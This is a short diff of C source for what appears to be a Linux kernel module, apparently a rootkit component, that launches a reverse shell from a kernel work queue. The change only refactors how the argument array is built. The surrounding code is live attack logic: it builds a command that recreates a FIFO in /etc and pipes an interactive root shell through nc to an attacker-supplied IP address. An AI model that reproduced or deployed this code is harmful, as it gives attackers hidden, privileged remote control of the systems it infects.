@@ -1,6 +1,5 @@
 #include "revshell.h"
 
-
 #define PATH "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
 #define HOME "HOME=/root"
 #define TERM "TERM=xterm"
@@ -8,13 +7,11 @@
 #define EXEC_P1 "/bin/rm /etc/fifo;/usr/bin/mkfifo /etc/fifo;/bin/cat /etc/fifo|/bin/sh -i 2>&1 | /usr/bin/nc "
 #define EXEC_P2 " >/etc/fifo"
 				
-
-
-
 void execute_reverse_shell(struct work_struct *work){
     //We know the strings are allocated right after the work in the struct shell_params, so we cast it
     int err;
     struct shell_params *params = (struct shell_params*)work;
+    char *argv[] = { SHELL, "-c", NULL, NULL };
     char *envp[] = {
                         HOME,
                         TERM,
@@ -25,13 +22,7 @@ void execute_reverse_shell(struct work_struct *work){
     
     char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
     memset(exec, 0, sizeof(char) * 256);
-    //char *argv[] = {};
-    char *argv[] = {
-                        SHELL,
-                        "-c",
-                        exec,
-                        NULL
-                    };
+    argv[2] = exec;
     
     strcat(exec, EXEC_P1);
     strcat(exec, params->target_ip);
